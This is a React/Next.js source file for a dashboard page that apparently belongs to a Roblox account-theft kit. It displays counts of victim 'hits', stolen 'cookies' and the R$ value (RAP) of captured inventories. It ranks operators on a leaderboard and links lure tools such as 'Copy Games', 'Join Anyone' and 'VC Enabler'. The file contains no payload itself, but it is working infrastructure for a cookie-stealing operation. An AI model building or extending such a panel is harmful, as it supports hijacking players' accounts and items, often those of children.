'use client'

import { useState, useEffect } from 'react'
import Link from 'next/link'
import { LayoutDashboard, Activity, Users, FolderOpen, Trophy, TrendingUp, ExternalLink, Link as LinkIcon, Settings, Palette, HardDrive, ArrowRight } from 'lucide-react'

interface Stats {
  hits: number
  rap: number
  cookies: number
}

interface LeaderboardUser {
  rank: number
  displayName: string
  level: string | number
  hits: number
  rap: number
  directory: string
}

const TOOLS = [
  { name: 'Copy Clothes', icon: '👕', path: 'Copy-Clothes', color: 'from-red-500 to-orange-500' },
  { name: 'Copy Games', icon: '🎮', path: 'Copy-Games', color: 'from-green-500 to-emerald-500' },
  { name: 'Bot Followers', icon: '👤', path: 'Bot-Followers', color: 'from-blue-500 to-cyan-500' },
  { name: 'Group Botter', icon: '👥', path: 'Group-Botter', color: 'from-purple-500 to-pink-500' },
  { name: 'VC Enabler', icon: '🎤', path: 'Vc-Enabler', color: 'from-pink-500 to-rose-500' },
  { name: 'Join Anyone', icon: '🔓', path: 'Join-Anyone', color: 'from-amber-500 to-yellow-500' },
  { name: 'Enable Shaders', icon: '✨', path: 'Enable-Shaders', color: 'from-cyan-500 to-teal-500' },
  { name: 'Limited Checker', icon: '🔍', path: 'Limited-Checker', color: 'from-emerald-500 to-green-500' }
]

const NAV_ITEMS = [
  { name: 'Links', href: '/links', icon: LinkIcon, emoji: '🔗' },
  { name: 'Storage', href: '/storage', icon: HardDrive, emoji: '📦' },
  { name: 'Settings', href: '/settings', icon: Settings, emoji: '⚙️' },
  { name: 'Custom Pages', href: '/custom-pages', icon: Palette, emoji: '🎨' }
]

export default function DashboardPage() {
  const [stats, setStats] = useState<Stats | null>(null)
  const [leaderboard, setLeaderboard] = useState<LeaderboardUser[]>([])
  const [directory, setDirectory] = useState<string>('')

  useEffect(() => {
    // Fetch stats
    fetch('/api/dashboard')
      .then(r => r.json())
      .then(d => {
        if (d.success) {
          setStats(d.stats)
        }
      })
      .catch(() => {})

    // Fetch leaderboard
    fetch('/api/dashboard?action=leaderboard')
      .then(r => r.json())
      .then(d => {
        if (d.success) {
          setLeaderboard(d.leaderboard || [])
        }
      })
      .catch(() => {})

    // Get session
    try {
      const cookies = document.cookie.split(';')
      for (const c of cookies) {
        if (c.trim().startsWith('rc_session=')) {
          const val = decodeURIComponent(c.trim().split('=')[1])
          const parts = val.split(':')
          const decrypted = atob(parts[1] || '')
          const session = JSON.parse(decrypted)
          setDirectory(session.directory)
          break
        }
      }
    } catch {}
  }, [])

  return (
    <div className="min-h-screen bg-[#09090b] p-4 pb-24">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-gradient-to-br from-blue-500 to-purple-600 rounded-xl flex items-center justify-center">
              <LayoutDashboard size={20} />
            </div>
            <div>
              <h1 className="text-2xl font-bold">Dashboard</h1>
              <p className="text-xs text-gray-500">{directory || 'Loading...'}</p>
            </div>
          </div>
          <div className="flex items-center gap-2 px-3 py-1.5 bg-green-500/10 border border-green-500/25 rounded-full">
            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse" />
            <span className="text-green-400 text-xs font-medium">Live</span>
          </div>
        </div>

        {/* Stats Grid */}
        {stats && (
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
            <div className="bg-[#111] border border-[#27272a] rounded-2xl p-5 hover:border-blue-500/30 transition-colors group">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-10 h-10 rounded-xl bg-blue-500/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                  <Activity size={20} className="text-blue-400" />
                </div>
                <span className="text-sm text-gray-400">Total Hits</span>
              </div>
              <p className="text-3xl font-bold">{stats.hits.toLocaleString()}</p>
            </div>

            <div className="bg-[#111] border border-[#27272a] rounded-2xl p-5 hover:border-green-500/30 transition-colors group">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-10 h-10 rounded-xl bg-green-500/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                  <TrendingUp size={20} className="text-green-400" />
                </div>
                <span className="text-sm text-gray-400">Total RAP</span>
              </div>
              <p className="text-3xl font-bold">{stats.rap?.toLocaleString() || '0'}<span className="text-lg text-gray-500 ml-1">R$</span></p>
            </div>

            <div className="bg-[#111] border border-[#27272a] rounded-2xl p-5 hover:border-purple-500/30 transition-colors group">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-10 h-10 rounded-xl bg-purple-500/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                  <Users size={20} className="text-purple-400" />
                </div>
                <span className="text-sm text-gray-400">Cookies</span>
              </div>
              <p className="text-3xl font-bold">{stats.cookies}</p>
            </div>

            <div className="bg-[#111] border border-[#27272a] rounded-2xl p-5 hover:border-amber-500/30 transition-colors group">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-10 h-10 rounded-xl bg-amber-500/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                  <FolderOpen size={20} className="text-amber-400" />
                </div>
                <span className="text-sm text-gray-400">Workspace</span>
              </div>
              <p className="text-lg font-bold truncate">{directory || '...'}</p>
            </div>
          </div>
        )}

        {/* Quick Tools Grid */}
        <div className="mb-8">
          <h2 className="text-lg font-semibold mb-4 flex items-center gap-2">
            <Sparkles size={20} className="text-yellow-400" />
            Quick Tools
          </h2>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            {TOOLS.map((tool) => (
              <Link
                key={tool.path}
                href={`/${tool.path}/${directory}`}
                className="group bg-[#111] border border-[#27272a] rounded-xl p-4 hover:border-[#3f3f46] transition-all hover:scale-[1.02]"
              >
                <span className="text-2xl block mb-2">{tool.icon}</span>
                <p className="font-medium text-sm text-white group-hover:text-blue-400 transition-colors">{tool.name}</p>
              </Link>
            ))}
          </div>
        </div>

        {/* Leaderboard */}
        {leaderboard.length > 0 && (
          <div className="bg-[#111] border border-[#27272a] rounded-2xl p-6 mb-8">
            <h2 className="font-semibold mb-4 flex items-center gap-2">
              <Trophy size={20} className="text-yellow-400" />
              Top Users
            </h2>
            <div className="space-y-3">
              {leaderboard.slice(0, 5).map((user: LeaderboardUser) => (
                <div key={user.directory} className="flex items-center justify-between p-3 rounded-xl bg-[#09090b] hover:bg-[#18181b] transition-colors">
                  <div className="flex items-center gap-3">
                    <span className="w-8 text-center font-bold text-lg">
                      {user.rank === 1 ? '👑' : user.rank === 2 ? '🥈' : user.rank === 3 ? '🥉' : `#${user.rank}`}
                    </span>
                    <div>
                      <p className="font-medium text-sm">{user.displayName}</p>
                      <p className="text-xs text-gray-500">Level {user.level} • {user.hits} hits</p>
                    </div>
                  </div>
                  <span className="text-sm font-semibold text-green-400">{user.rap?.toLocaleString()} R$</span>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Navigation Links */}
        <div className="flex gap-3 overflow-x-auto pb-4 scrollbar-hide">
          {NAV_ITEMS.map((item) => (
            <Link
              key={item.name}
              href={item.href}
              className="flex items-center gap-2 px-5 py-3 bg-[#111] border border-[#27272a] rounded-xl text-sm font-medium whitespace-nowrap hover:border-blue-500/50 hover:bg-[#18181b] transition-all group"
            >
              <span>{item.emoji}</span>
              {item.name}
              <ArrowRight size={14} className="opacity-0 group-hover:opacity-100 transition-opacity -ml-1" />
            </Link>
          ))}
        </div>
      </div>
    </div>
  )
}

// Import Sparkles used above
function Sparkles(props: any) {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" width={props.size || 20} height={props.size || 20} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" {...props}>
      <path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/>
      <path d="M5 3v4"/><path d="M19 17v4"/><path d="M3 5h4"/><path d="M17 19h4"/>
    </svg>
  )
}
